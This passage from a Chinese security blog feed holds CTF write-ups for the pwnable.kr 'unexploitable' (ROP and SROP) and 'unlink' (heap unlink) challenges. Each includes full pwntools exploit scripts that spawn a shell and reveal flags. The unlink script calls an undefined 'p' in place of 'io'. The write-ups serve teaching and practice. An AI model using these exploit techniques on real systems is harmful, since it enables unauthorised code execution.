<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="comment">// no brute forcing</span></div><div class="line">    sleep(<span class="number">3</span>);</div><div class="line">    <span class="comment">// exploit me</span></div><div class="line">    <span class="keyword">int</span> buf[<span class="number">4</span>];</div><div class="line">    read(<span class="number">0</span>, buf, <span class="number">1295</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>第一反应是用return to dl reslove，但是仔细一看没法做内存泄漏。因为64位需要把debug位置0，但是无法得到link_map的地址，所以这条路走不通。只能在题目给出的<code>syscall</code>上做文章。</p>
<a id="more"></a>
<h2 id="0x01-ROP"><a href="#0x01-ROP" class="headerlink" title="0x01 ROP"></a>0x01 ROP</h2><p>思路就是直接利用<code>syscall</code>来调用<code>execve(&quot;/bin/sh&quot;, 0, 0)</code>来执行shell，因为<code>execve</code>调用的id为59，所以只需要将<code>RAX</code>置为59，<code>RDI</code>、<code>RSI</code>和<code>RDX</code>。此时有个问题，在搜索ROP Gadgets后没有找到<code>RAX</code>的Gadget。<br>网上搜了一个猥琐的思路，利用函数的返回值来修改<code>RAX</code>的值，眼下看比较好的函数就是<code>read</code>了，根据输入字符串的长度来控制<code>RAX</code>的值。</p>
<p>思路：</p>
<ol>
<li>覆盖返回地址，调用<code>read</code>将第二段payload和<code>/bin/sh</code>写入bss段</li>
<li>执行第二段payload，控制<code>RAX</code>，利用<code>syscall</code>执行<code>execve(&quot;/bin/sh&quot;)</code></li>
</ol>
<p>最终的exploit如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment">#io = remote("127.0.0.1", 10001)</span></div><div class="line">io = process(<span class="string">"/home/unexploitable/unexploitable"</span>)</div><div class="line">bss_base = <span class="number">0x0000000000601028</span> + <span class="number">0x200</span></div><div class="line">bash_addr = <span class="number">0x0000000000601028</span> + <span class="number">0x400</span></div><div class="line">elf = ELF(<span class="string">"/home/unexploitable/unexploitable"</span>)</div><div class="line">syscall_addr = <span class="number">0x00400560</span></div><div class="line">pop_rbp_ret = <span class="number">0x00400512</span><span class="comment">#: pop rbp ; ret  ;  (1 found)</span></div><div class="line">leave_ret = <span class="number">0x00400576</span><span class="comment">#: leave  ; ret  ;  (1 found)</span></div><div class="line">part1 = <span class="number">0x004005e6</span><span class="comment">#: mov rbx, qword [rsp+0x08] ; mov rbp, qword [rsp+0x10] ; mov r12, qword [rsp+0x18] ; mov r13, qword [rsp+0x20] ; mov r14, qword [rsp+0x28] ; mov r15, qword [rsp+0x30] ; add rsp, 0x38 ; ret  ;  (1 found)</span></div><div class="line">part2 = <span class="number">0x004005d0</span><span class="comment">#: mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword [r12+rbx*8] ;  (1 found)</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_function</span><span class="params">(call_addr, arg1, arg2, arg3)</span>:</span></div><div class="line">    payload = <span class="string">""</span></div><div class="line">    payload += p64(part1)       <span class="comment"># =&gt; RSP</span></div><div class="line">    payload += <span class="string">"A"</span> * <span class="number">8</span></div><div class="line">    payload += p64(<span class="number">0</span>)           <span class="comment"># =&gt; RBX</span></div><div class="line">    payload += p64(<span class="number">1</span>)           <span class="comment"># =&gt; RBP</span></div><div class="line">    payload += p64(call_addr)   <span class="comment"># =&gt; R12 =&gt; RIP</span></div><div class="line">    payload += p64(arg1)        <span class="comment"># =&gt; R13 =&gt; RDI</span></div><div class="line">    payload += p64(arg2)        <span class="comment"># =&gt; R14 =&gt; RSI</span></div><div class="line">    payload += p64(arg3)        <span class="comment"># =&gt; R16 =&gt; RDX</span></div><div class="line">    payload += p64(part2)</div><div class="line">    payload += <span class="string">"C"</span> * <span class="number">0x38</span></div><div class="line">    <span class="keyword">return</span> payload</div><div class="line"></div><div class="line">payload1  = <span class="string">"A"</span> * <span class="number">0x10</span></div><div class="line">payload1 += p64(bss_base)</div><div class="line">payload1 += call_function(elf.got[<span class="string">"read"</span>], <span class="number">0</span>, bss_base, <span class="number">0x200</span>)</div><div class="line">payload1 += p64(pop_rbp_ret)</div><div class="line">payload1 += p64(bss_base)</div><div class="line">payload1 += p64(leave_ret)</div><div class="line"></div><div class="line">payload2  = p64(bss_base+<span class="number">0x8</span>)</div><div class="line">payload2 += call_function(elf.got[<span class="string">"read"</span>], <span class="number">0</span>, bash_addr, <span class="number">0x200</span>)</div><div class="line">payload2 += call_function(bash_addr+<span class="number">0x10</span>, bash_addr, <span class="number">0</span>, <span class="number">0</span>)</div><div class="line"></div><div class="line">payload3 = <span class="string">"/bin/sh\x00"</span>.ljust(<span class="number">0x10</span>, <span class="string">"B"</span>)</div><div class="line">payload3 += p64(syscall_addr)</div><div class="line">payload3 = payload3.ljust(<span class="number">59</span>, <span class="string">"D"</span>)</div><div class="line"></div><div class="line">sleep(<span class="number">3</span>)</div><div class="line">raw_input()</div><div class="line">io.send(payload1)</div><div class="line">raw_input()</div><div class="line">io.send(payload2)</div><div class="line">raw_input()</div><div class="line">io.send(payload3)</div><div class="line"></div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
<h2 id="0x02-SROP"><a href="#0x02-SROP" class="headerlink" title="0x02 SROP"></a>0x02 SROP</h2><p>Sigreturn Oriented Programming (SROP)，这个方法是用来攻击POSIX主机的信号处理机制的。</p>
<p>Linux系统上，Signal本质上是对<code>中断机制的模拟</code>，Signal的来源主要有以下途径：</p>
<ol>
<li>硬件来源：按下键盘或者其他故障</li>
<li>软件来源: <code>kill</code>等；非法操作</li>
</ol>
<p>接受到了Signal后，程序的执行流程如下所示</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">    +---------+             +---------+             +---------+</div><div class="line">    | Process |             | Handler |             | Process |</div><div class="line">    +---------+             +---------+             +---------+</div><div class="line">        |                       ^   |                   ^</div><div class="line">User    |                       |   |                   |</div><div class="line">-----------------------------------------------------------------------</div><div class="line">Kenerl  |                       |   |                   |</div><div class="line">        |       +---------+     |   |   +---------+     |</div><div class="line">        +------&gt;|  Save   |-----+   +--&gt;| Restore |-----+</div><div class="line">                +---------+             +---------+</div></pre></td></tr></table></figure>
<ol>
<li>进入内核态</li>
<li>保存上下文</li>
<li>回到用户态执行相关信号处理函数</li>
<li>进入内核态恢复上下文</li>
<li>进程继续执行</li>
</ol>
<p>在程序接受Signal后，内核将进程的上下文<code>context(r8-r15, rax, rbx, rcx, rdx, rdi, rsi等)</code>保存在<code>栈</code>上，称作<code>Signal Frame</code>；当进程收到<code>rt_sigreturn</code>会从栈上取<code>Signal Frame</code>用来恢复进程的上下文。</p>
<p>Signal Frame实例如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">                    Signal Frame</div><div class="line">+-------------------------+-------------------------+</div><div class="line">|        rt_sigreturn     |         uc_flags        |</div><div class="line">+-------------------------+-------------------------+</div><div class="line">|          &amp;uc            |       uc_stack.ss_sp    |</div><div class="line">+-------------------------+-------------------------+</div><div class="line">|    uc_stack.ss_flags    |    uc_stack.ss_size     |</div><div class="line">+-------------------------+-------------------------+</div><div class="line">|          r8             |           r9            |</div><div class="line">+-------------------------+-------------------------+</div><div class="line">|          r10            |           r11           |</div><div class="line">+-------------------------+-------------------------+</div><div class="line">|          r12            |           r13           |</div><div class="line">+-------------------------+-------------------------+</div><div class="line">|          r14            |           r15           |</div><div class="line">+-------------------------+-------------------------+</div><div class="line">|          rdi            |           rsi           |</div><div class="line">+-------------------------+-------------------------+</div><div class="line">|          rbp            |           rbx           |</div><div class="line">+-------------------------+-------------------------+</div><div class="line">|          rdx            |           rax           |</div><div class="line">+-------------------------+-------------------------+</div><div class="line">|          rcx            |           rsp           |</div><div class="line">+-------------------------+-------------------------+</div><div class="line">|          rip            |           eflags        |</div><div class="line">+-------------------------+-------------------------+</div><div class="line">|        cs/gs/fs         |           err           |</div><div class="line">+-------------------------+-------------------------+</div><div class="line">|         trapno          |         oldmask         |</div><div class="line">+-------------------------+-------------------------+</div><div class="line">|          cr2            |          %fpstate       |</div><div class="line">+-------------------------+-------------------------+</div><div class="line">|       __reserved        |         sigmask         |</div><div class="line">+-------------------------+-------------------------+</div></pre></td></tr></table></figure>
<p>所以，可选的攻击方式就是构造一个<code>fake signal frame</code>写入内存中，将然后将<code>RSP</code>指向这段空间，再发送<code>rt_sigreturn</code>信号。此时，内核会将构造好的<code>fake signal frame</code>取出，恢复。恢复后类似于ROP的方式，为syscall调用<code>execve</code>。</p>
<p>最终的exploit如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">io = remote(<span class="string">"127.0.0.1"</span>, <span class="number">10001</span>)</div><div class="line"></div><div class="line"></div><div class="line">elf = ELF(<span class="string">"./unexploitable"</span>)</div><div class="line">bss_base = <span class="number">0x0000000000601028</span> + <span class="number">0x100</span></div><div class="line">sig_stage = bss_base + <span class="number">0x400</span></div><div class="line"></div><div class="line">syscall_addr = <span class="number">0x00400560</span></div><div class="line">pop_rbp_ret = <span class="number">0x00400512</span><span class="comment">#: pop rbp ; ret  ;  (1 found)</span></div><div class="line">leave_ret = <span class="number">0x00400576</span><span class="comment">#: leave  ; ret  ;  (1 found)</span></div><div class="line">part1 = <span class="number">0x004005e6</span><span class="comment">#: mov rbx, qword [rsp+0x08] ; mov rbp, qword [rsp+0x10] ; mov r12, qword [rsp+0x18] ; mov r13, qword      [rsp+0x20] ; mov r14, qword [rsp+0x28] ; mov r15, qword [rsp+0x30] ; add rsp, 0x38 ; ret  ;  (1 found)</span></div><div class="line">part2 = <span class="number">0x004005d0</span><span class="comment">#: mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword [r12+rbx*8] ;  (1 found)</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_function</span><span class="params">(call_addr, arg1, arg2, arg3)</span>:</span></div><div class="line">    payload = <span class="string">""</span></div><div class="line">    payload += p64(part1)       <span class="comment"># =&gt; RSP</span></div><div class="line">    payload += <span class="string">"A"</span> * <span class="number">8</span></div><div class="line">    payload += p64(<span class="number">0</span>)           <span class="comment"># =&gt; RBX</span></div><div class="line">    payload += p64(<span class="number">1</span>)           <span class="comment"># =&gt; RBP</span></div><div class="line">    payload += p64(call_addr)   <span class="comment"># =&gt; R12 =&gt; RIP</span></div><div class="line">    payload += p64(arg1)        <span class="comment"># =&gt; R13 =&gt; RDI</span></div><div class="line">    payload += p64(arg2)        <span class="comment"># =&gt; R14 =&gt; RSI</span></div><div class="line">    payload += p64(arg3)        <span class="comment"># =&gt; R16 =&gt; RDX</span></div><div class="line">    payload += p64(part2)</div><div class="line">    payload += <span class="string">"C"</span> * <span class="number">0x38</span></div><div class="line">    <span class="keyword">return</span> payload</div><div class="line"></div><div class="line">sig_frame  = <span class="string">""</span></div><div class="line">sig_frame += p64(syscall_addr) + p64(<span class="number">0</span>)</div><div class="line">sig_frame += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</div><div class="line">sig_frame += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</div><div class="line">sig_frame += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)            <span class="comment"># r8 r9</span></div><div class="line">sig_frame += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)            <span class="comment"># r10 r11</span></div><div class="line">sig_frame += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)            <span class="comment"># r12 r13</span></div><div class="line">sig_frame += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)            <span class="comment"># r14 r15</span></div><div class="line">sig_frame += p64(bss_base+<span class="number">0x200</span>) + p64(<span class="number">0</span>)   <span class="comment"># rdi rsi</span></div><div class="line">sig_frame += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)            <span class="comment"># rbp rbx</span></div><div class="line">sig_frame += p64(<span class="number">0</span>) + p64(<span class="number">59</span>)           <span class="comment"># rdx rax(execve)</span></div><div class="line">sig_frame += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)            <span class="comment"># rcx rsp</span></div><div class="line">sig_frame += p64(syscall_addr) + p64(<span class="number">0x207</span>) <span class="comment"># rip eflags</span></div><div class="line">sig_frame += p64(<span class="number">0x33</span>) + p64(<span class="number">0</span>)         <span class="comment"># cs/gs/fs err</span></div><div class="line">sig_frame += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)            <span class="comment"># trapno oldmask</span></div><div class="line">sig_frame += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)            <span class="comment"># cr2 &amp;fpstate</span></div><div class="line">sig_frame += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)            <span class="comment"># __reserved sigmask</span></div><div class="line"></div><div class="line">payload1  = <span class="string">"A"</span> * <span class="number">0x10</span></div><div class="line">payload1 += p64(bss_base)</div><div class="line">payload1 += call_function(elf.got[<span class="string">"read"</span>], <span class="number">0</span>, bss_base, <span class="number">0x300</span>)</div><div class="line">payload1 += p64(pop_rbp_ret)</div><div class="line">payload1 += p64(bss_base)</div><div class="line">payload1 += p64(leave_ret)</div><div class="line"></div><div class="line">payload2  = p64(bss_base+<span class="number">0x8</span>)</div><div class="line">payload2 += call_function(elf.got[<span class="string">"read"</span>], <span class="number">0</span>, sig_stage, <span class="number">0x100</span>)</div><div class="line">payload2 += sig_frame</div><div class="line">payload2  = payload2.ljust(<span class="number">0x200</span>, <span class="string">"\x00"</span>)</div><div class="line">payload2 += <span class="string">"/bin/sh\x00"</span></div><div class="line"></div><div class="line">payload3  = <span class="string">"D"</span> * <span class="number">0xf</span></div><div class="line"></div><div class="line">sleep(<span class="number">3</span>)</div><div class="line">raw_input()</div><div class="line">io.send(payload1)</div><div class="line">raw_input()</div><div class="line">io.send(payload2)</div><div class="line">raw_input()</div><div class="line">io.send(payload3)</div><div class="line"></div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
<p>结果如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">unexploitable@ubuntu:/tmp$ python expp.py</div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'/home/unexploitable/unexploitable'</span>: Done</div><div class="line">[*] <span class="string">'/home/unexploitable/unexploitable'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div><div class="line">[*] Switching to interactive mode</div><div class="line">$ cat /home/unexploitable/flag</div><div class="line">sigreturn rop..? not a secret technique anymore!!</div></pre></td></tr></table></figure>
<p>SROP比ROP的优势在于，ROP需要用大量的Gadgets来完成寄存器的设置；而SROP只需要一块够大的内存空间，将<code>fake signal frame</code>部署到内存中即可。</p>
<h2 id="0x03-Refer"><a href="#0x03-Refer" class="headerlink" title="0x03 Refer"></a>0x03 Refer</h2><p><a href="http://www.freebuf.com/articles/network/87447.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/87447.html</a><br><a href="http://www.spongeliu.com/165.html" target="_blank" rel="external">http://www.spongeliu.com/165.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-unexploitable&quot;&gt;&lt;a href=&quot;#0x00-unexploitable&quot; class=&quot;headerlink&quot; title=&quot;0x00 unexploitable&quot;&gt;&lt;/a&gt;0x00 unexploitable&lt;/h2&gt;&lt;p&gt;看看源代码，很简单的程序&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// no brute forcing&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    sleep(&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// exploit me&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; buf[&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    read(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, buf, &lt;span class=&quot;number&quot;&gt;1295&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第一反应是用return to dl reslove，但是仔细一看没法做内存泄漏。因为64位需要把debug位置0，但是无法得到link_map的地址，所以这条路走不通。只能在题目给出的&lt;code&gt;syscall&lt;/code&gt;上做文章。&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>unlink Writeup[pwnable.kr]</title>
    <link href="http://weaponx.site/2017/02/21/unlink-Writeup-pwnable-kr/"/>
    <id>http://weaponx.site/2017/02/21/unlink-Writeup-pwnable-kr/</id>
    <published>2017-02-21T06:43:18.000Z</published>
    <updated>2017-02-21T06:44:49.080Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-unlink"><a href="#0x00-unlink" class="headerlink" title="0x00 unlink"></a>0x00 unlink</h2><p>unlink是堆溢出的常用思路，free一个堆时。有可能会调用unlink函数来拆卸freelist上堆块完成堆块的合并。如果能控制堆的控制区就有可能造成DWSHOOT（有限的任意地址写入）。</p>
<a id="more"></a>
<h2 id="0x01-题目源码"><a href="#0x01-题目源码" class="headerlink" title="0x01 题目源码"></a>0x01 题目源码</h2><p>程序的源代码如下，根据题目就可以猜到是堆溢出的unlink漏洞。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> tagOBJ&#123;</div><div class="line">    <span class="keyword">struct</span> tagOBJ* fd;</div><div class="line">    <span class="keyword">struct</span> tagOBJ* bk;</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>];</div><div class="line">&#125;OBJ;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</div><div class="line">    system(<span class="string">"/bin/sh"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(OBJ* P)</span></span>&#123;</div><div class="line">    OBJ* BK;</div><div class="line">    OBJ* FD;</div><div class="line">    BK=P-&gt;bk;</div><div class="line">    FD=P-&gt;fd;</div><div class="line">    FD-&gt;bk=BK;</div><div class="line">    BK-&gt;fd=FD;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line">    <span class="built_in">malloc</span>(<span class="number">1024</span>);</div><div class="line">    OBJ* A = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</div><div class="line">    OBJ* B = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</div><div class="line">    OBJ* C = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</div><div class="line"></div><div class="line">    <span class="comment">// double linked list: A &lt;-&gt; B &lt;-&gt; C</span></div><div class="line">    A-&gt;fd = B;</div><div class="line">    B-&gt;bk = A;</div><div class="line">    B-&gt;fd = C;</div><div class="line">    C-&gt;bk = B;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"here is stack address leak: %p\n"</span>, &amp;A);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"here is heap address leak: %p\n"</span>, A);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"now that you have leaks, get shell!\n"</span>);</div><div class="line">    <span class="comment">// heap overflow!</span></div><div class="line">    gets(A-&gt;buf);</div><div class="line"></div><div class="line">    <span class="comment">// exploit this unlink!</span></div><div class="line">    unlink(B);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="0x01-思路"><a href="#0x01-思路" class="headerlink" title="0x01 思路"></a>0x01 思路</h2><p>因为<code>gets(A-&gt;buf)</code>有一个缓冲区溢出，可以控制堆A、B和C的内容。unlink模拟堆溢出free后造成的任意地址写DWSHOOT，</p>
<p>1.通过写GOT表完成GOT Hijack<br>2.写程序的返回地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">unlink@ubuntu:~$ checksec unlink</div><div class="line">[*] <span class="string">'/home/unlink/unlink'</span></div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div></pre></td></tr></table></figure>
<p>没有开启RELRO，所以应该有两种方法来完成利用。</p>
<p>第一种方法，通过GOT劫持来完成利用。结果在unlink后没有调用任何函数，所以这个思路行不通。</p>
<p>第二种方法，写程序的返回地址。再看<code>unlink</code>函数的操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(OBJ* P)</span></span>&#123;</div><div class="line">    OBJ* BK;</div><div class="line">    OBJ* FD;</div><div class="line">    BK=P-&gt;bk;</div><div class="line">    FD=P-&gt;fd;</div><div class="line">    FD-&gt;bk=BK;</div><div class="line">    BK-&gt;fd=FD;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>通过调试程序，发现三个堆在内存中的分布如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">                   +---------------+</div><div class="line">                   |               |</div><div class="line">[heap addr] -----&gt; +-------+-------+</div><div class="line">             +-----|  FD   |  BK   |</div><div class="line">[A-&gt;buff]----|---&gt; +-------+-------+&lt;-------+</div><div class="line">             |     |               |  A     |</div><div class="line">             |     +---------------+        |</div><div class="line">             |     |               |        |</div><div class="line">             |     +-------+-------+        |</div><div class="line">       +-----|-----|  FD   |  BK   |--------+</div><div class="line">       |     +---&gt; +-------+-------+ &lt;------+</div><div class="line">       |           |               |  B     |</div><div class="line">       |           +---------------+        |</div><div class="line">       |           |               |        |</div><div class="line">       |           +-------+-------+        |</div><div class="line">       |           |  FD   |  BK   |--------+</div><div class="line">       +--------&gt;  +-------+-------+  </div><div class="line">                   |               |  C</div><div class="line">                   +---------------+</div></pre></td></tr></table></figure>
<p>其实<code>unlink(B)</code>操作完成了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">B-&gt;fd-&gt;bk = B-&gt;bk</div><div class="line">B-&gt;bk-&gt;fd = B-&gt;fd</div></pre></td></tr></table></figure>
<p>如果要利用unlink来覆盖返回地址，则B的布局应该是这样的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">+-------------------+-------------------+</div><div class="line">|stack[<span class="built_in">return</span> addr] |     addr shell    |</div><div class="line">+-------------------+-------------------+</div><div class="line">|               padding                 |</div><div class="line">+---------------------------------------+</div></pre></td></tr></table></figure>
<p>这样在执行<code>B-&gt;fd-&gt;bk = B-&gt;bk</code>就完成了覆盖main的返回地址。But，执行<code>B-&gt;bk-&gt;fd = B-&gt;fd</code>这一段的时候，<code>[addr shell]</code>则会落入不可读写的地址，造成程序段错误。所以，这个思路又进了死胡同。</p>
<p>然后看到了main函数结尾的语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">80485f2:   e8 0d ff ff ff          call   8048504 &lt;unlink&gt;</div><div class="line">80485f7:   83 c4 10                add    $0x10,%esp</div><div class="line">80485fa:   b8 00 00 00 00          mov    $0x0,%eax</div><div class="line">80485ff:   8b 4d fc                mov    -0x4(%ebp),%ecx</div><div class="line">8048602:   c9                      leave  </div><div class="line">8048603:   8d 61 fc                lea    -0x4(%ecx),%esp</div><div class="line">8048606:   c3                      ret</div></pre></td></tr></table></figure>
<p>简单的翻译一下就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">mov ecx, [ebp - 0x4]</div><div class="line">mov esp, ebp</div><div class="line">pop ebp</div><div class="line">lea esp, [ecx - 0x4]</div><div class="line">ret</div></pre></td></tr></table></figure>
<p>看看此时栈上的数据</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">0000| 0xffd692c0 --&gt; 0x1 </div><div class="line">0004| 0xffd692c4 --&gt; 0x875c410 --&gt; 0x875c440 --&gt; 0x0 [A] </div><div class="line">0008| 0xffd692c8 --&gt; 0x875c440 --&gt; 0x0               [C]</div><div class="line">0012| 0xffd692cc --&gt; 0x875c428 --&gt; 0x875c440 --&gt; 0x0 [B]</div><div class="line">0016| 0xffd692d0 --&gt; 0xf76c93dc --&gt; 0xf76ca1e0 --&gt; 0x0 </div><div class="line">0020| 0xffd692d4 --&gt; 0xffd692f0 --&gt; 0x1 </div><div class="line">0024| 0xffd692d8 --&gt; 0x0  [EBP]</div><div class="line">0028| 0xffd692dc --&gt; 0xf7532637 (&lt;__libc_start_main+247&gt;:   add    esp,0x10)</div></pre></td></tr></table></figure>
<p>所以，只要能控制栈上的数据，就可以控制ESP，从而控制EIP。但是问题来了，这个题目只是堆溢出，无法直接控制栈上的数据。所以只能利用unlink的DWSHOOT来完成栈上数据的修改。</p>
<p>所以，我们只需要这样布局内存空间即可完成覆盖ESP：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">+-------------------+-------------------+  &lt;- heap addr[A]</div><div class="line">|        FD         |        BK         |</div><div class="line">+-------------------+-------------------+  &lt;- [A-&gt;buf]</div><div class="line">|     shell addr    |      AAAA         |</div><div class="line">+---------------------------------------+</div><div class="line">|              AAAAAAAA                 |</div><div class="line">+---------------------------------------+  &lt;- [B]</div><div class="line">|     heap + 12     |     stack + 16    |</div><div class="line">+-------------------+-------------------+</div></pre></td></tr></table></figure>
<p>所以最终的exploit如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">io = process(<span class="string">'./unlink'</span>)</div><div class="line">shell_addr = <span class="number">0x80484eb</span></div><div class="line"></div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'here is stack address leak: '</span>)</div><div class="line">stack_addr = p.recv(<span class="number">10</span>)</div><div class="line">p.recvuntil(<span class="string">'here is heap address leak: '</span>)</div><div class="line">heap_addr = p.recv(<span class="number">9</span>)</div><div class="line"></div><div class="line"></div><div class="line">stack_addr = int(stack_addr, <span class="number">16</span>)</div><div class="line">heap_addr = int(heap_addr, <span class="number">16</span>)</div><div class="line">target_addr = stack_addr + <span class="number">0x10</span> </div><div class="line"></div><div class="line">payload  = p32(shell_addr)</div><div class="line">payload += <span class="string">'A'</span> * <span class="number">12</span></div><div class="line">payload += p32(heap_addr + <span class="number">12</span>)</div><div class="line">payload += p32(target_addr)</div><div class="line">io.sendline(payload)</div><div class="line"></div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">cat flag</div><div class="line">conditional_write_what_where_from_unl1nk_explo1t</div></pre></td></tr></table></figure>
<p>顺便看了下题目给出的标准答案：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.arch = <span class="string">'i386'</span>   <span class="comment"># i386 / arm</span></div><div class="line">r = process([<span class="string">'/home/unlink/unlink'</span>])</div><div class="line">leak = r.recvuntil(<span class="string">'shell!\n'</span>)</div><div class="line">stack = int(leak.split(<span class="string">'leak: 0x'</span>)[<span class="number">1</span>][:<span class="number">8</span>], <span class="number">16</span>)</div><div class="line">heap = int(leak.split(<span class="string">'leak: 0x'</span>)[<span class="number">2</span>][:<span class="number">8</span>], <span class="number">16</span>)</div><div class="line">shell = <span class="number">0x80484eb</span></div><div class="line">payload = pack(shell)       <span class="comment"># heap + 8  (new ret addr)</span></div><div class="line">payload += pack(heap + <span class="number">12</span>)  <span class="comment"># heap + 12 (this -4 becomes ESP at ret)</span></div><div class="line">payload += <span class="string">'3333'</span>       <span class="comment"># heap + 16</span></div><div class="line">payload += <span 